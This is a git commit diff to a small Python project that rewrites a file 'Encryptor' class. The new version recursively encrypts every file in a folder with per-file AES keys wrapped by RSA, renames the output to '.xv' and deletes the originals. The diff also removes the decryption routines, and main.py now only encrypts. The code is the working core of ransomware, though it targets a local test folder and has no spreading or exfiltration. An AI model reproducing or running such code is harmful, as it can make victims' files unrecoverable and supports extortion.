5cfa45c5e8dc8fa358c6da6ba75c4ff0b487725c
amradhwen <radhweneamri9631@gmail.com>
2023-11-02 15:30:02 +0100

    .

--- Enctryptor.py
+++ Enctryptor.py
@@ -1,113 +1,62 @@
-import os
-from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
-import tempfile
-import shutil
+from Crypto.Cipher import AES, PKCS1_OAEP
+import os
 
 class Encryptor:
-    def __init__(self, private_key_path, public_key_path):
-        self.private_key_path = private_key_path
-        self.public_key_path = public_key_path
-        self.private_key = None
-        self.public_key = None
+    def __init__(self, keys_dir="keys"):
+        self.keys_dir = keys_dir
+        self.private_key_path = os.path.join(keys_dir, "private_key.pem")
+        self.public_key_path = os.path.join(keys_dir, "public_key.pem")
 
-        # Check if keys already exist, and load them if they do
-        if os.path.exists(private_key_path) and os.path.exists(public_key_path):
-            self.private_key = RSA.import_key(open(private_key_path).read())
-            self.public_key = RSA.import_key(open(public_key_path).read())
-        else:
-            # Generate new keys if they don't exist
-            self.generate_keys()
-
-    def generate_keys(self):
-        if not self.private_key or not self.public_key:
+    def generate_key_pair(self):
+        if not os.path.exists(self.keys_dir):
+            os.makedirs(self.keys_dir)
+        
+        if not os.path.exists(self.private_key_path) or not os.path.exists(self.public_key_path):
             key = RSA.generate(2048)
-            self.private_key = key
-            self.public_key = key.publickey()
+            private_key = key.export_key()
+            public_key = key.publickey().export_key()
+            
+            if not os.path.exists(self.private_key_path):
+                with open(self.private_key_path, "wb") as private_key_file:
+                    private_key_file.write(private_key)
+                
+            if not os.path.exists(self.public_key_path):
+                with open(self.public_key_path, "wb") as public_key_file:
+                    public_key_file.write(public_key)
 
-            with open(self.private_key_path, "wb") as private_key_file:
-                private_key_file.write(self.private_key.export_key())
-            with open(self.public_key_path, "wb") as public_key_file:
-                public_key_file.write(self.public_key.export_key())
+    def encrypt_file(self, input_file):
+        filename, ext = os.path.splitext(os.path.basename(input_file))
+        encrypted_file_name = f"{filename}{ext}.xv"
 
-    def generate_aes_key(self):
-        return get_random_bytes(32)  # 256-bit AES key
+        # Generate a random AES encryption key
+        aes_key = os.urandom(32)
+        aes_cipher = AES.new(aes_key, AES.MODE_EAX)
 
-    def encrypt_file(self, input_file, session_key):
-        # Extract the original file name and extension
-        filename, file_extension = os.path.splitext(input_file)
-        encrypted_file = f"{filename}{file_extension}.xvxv"
+        with open(input_file, "rb") as file:
+            plaintext = file.read()
 
-        # Generate a random initialization vector (IV) for AES
-        iv = get_random_bytes(16)
+        ciphertext, tag = aes_cipher.encrypt_and_digest(plaintext)
 
-        # Create an AES cipher with the session key and IV
-        cipher = AES.new(session_key, AES.MODE_CFB, iv)
+        # Encrypt the AES key with the recipient's public key (asymmetric encryption)
+        with open(self.public_key_path, "rb") as public_key_file:
+            recipient_key = RSA.import_key(public_key_file.read())
+            rsa_cipher = PKCS1_OAEP.new(recipient_key)
+            encrypted_aes_key = rsa_cipher.encrypt(aes_key)
 
-        with open(input_file, 'rb') as infile, open(encrypted_file, 'wb') as outfile:
-            outfile.write(iv)  # Write the IV to the output file
-            while True:
-                chunk = infile.read(8192)
-                if len(chunk) == 0:
-                    break
-                encrypted_chunk = cipher.encrypt(chunk)
-                outfile.write(encrypted_chunk)
+        output_dir = os.path.dirname(input_file)
+        encrypted_file_path = os.path.join(output_dir, encrypted_file_name)
 
-        # Remove the original file after successful encryption
+        with open(encrypted_file_path, "wb") as encrypted_file:
+            encrypted_file.write(encrypted_aes_key)
+            encrypted_file.write(aes_cipher.nonce)
+            encrypted_file.write(ciphertext)
+            encrypted_file.write(tag)
+
         os.remove(input_file)
 
     def encrypt_files_in_folder(self, folder_path):
-        private_key = RSA.import_key(open(self.private_key_path).read())
-        public_key = RSA.import_key(open(self.public_key_path).read())
-
         for root, _, files in os.walk(folder_path):
-            for file_name in files:
-                input_file_path = os.path.join(root, file_name)
-
-                # Skip already encrypted files
-                if file_name.endswith(".xvxv"):
-                    print(f"Skipping {file_name}: Already encrypted.")
-                    continue
-
-                session_key = self.generate_aes_key()
-                encrypted_session_key = PKCS1_OAEP.new(public_key).encrypt(session_key)
-
-                self.encrypt_file(input_file_path, session_key)
-
-                print(f"Encrypted {file_name} successfully.")
-
-    def decrypt_file(self, input_file, session_key):
-        with open(input_file, 'rb') as infile:
-            iv = infile.read(16)
-            cipher = AES.new(session_key, AES.MODE_CFB, iv)
-            decrypted_data = b""
-            while True:
-                chunk = infile.read(8192)
-                if not chunk:
-                    break
-                decrypted_chunk = cipher.decrypt(chunk)
-                decrypted_data += decrypted_chunk
-
-        # Extract the original file name without the .xvxv extension
-        filename, _ = os.path.splitext(input_file)
-
-        with open(filename, 'wb') as outfile:
-            outfile.write(decrypted_data)
-
-    def decrypt_files_in_folder(self, folder_path):
-        private_key = RSA.import_key(open(self.private_key_path).read())
-
-        for root, _, files in os.walk(folder_path):
-            for file_name in files:
-                if file_name.endswith(".xvxv"):
-                    input_file_path = os.path.join(root, file_name)
-
-                    # Use a temporary file to store the decrypted content
-                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
-                        self.decrypt_file(input_file_path, private_key)
-
-                    # Replace the original file with the decrypted content
-                    shutil.move(temp_file.name, os.path.join(root, f"{file_name[:-6]}"))
-                    os.remove(input_file_path)
-                    print(f"Decrypted {file_name} successfully.")
+            for file in files:
+                file_path = os.path.join(root, file)
+                self.encrypt_file(file_path)
--- main.py
+++ main.py
@@ -1,26 +1,11 @@
-from FileEncryptor import FileEncryptor
+
 from Enctryptor import Encryptor
 
-# Usage example:
-#password = "thisismysecretpassword"
-#salt = b'thisismysecretsalt'  # You can specify your own salt or leave it empty for a random salt
-#encryptor = FileEncryptor(password, salt)
-#folder_to_encrypt = "encryptme"
-
-# To encrypt files in the folder
-#encryptor.encrypt_folder(folder_to_encrypt)
-
-# To decrypt files in the folder
-#encryptor.decrypt_folder(folder_to_encrypt)
-
-
 if __name__ == "__main__":
-    private_key_path = 'private_key.pem'
-    public_key_path = 'public_key.pem'
-    folder_path = 'encryptme'
+    input_folder = "encryptme"
+    encryptor = Encryptor()
+    encryptor.generate_key_pair()
+    encryptor.encrypt_files_in_folder(input_folder)
 
-    encryptor = Encryptor(private_key_path, public_key_path)
-    #encryptor.encrypt_files_in_folder(folder_path)
-    encryptor.decrypt_files_in_folder(folder_path)
 
 
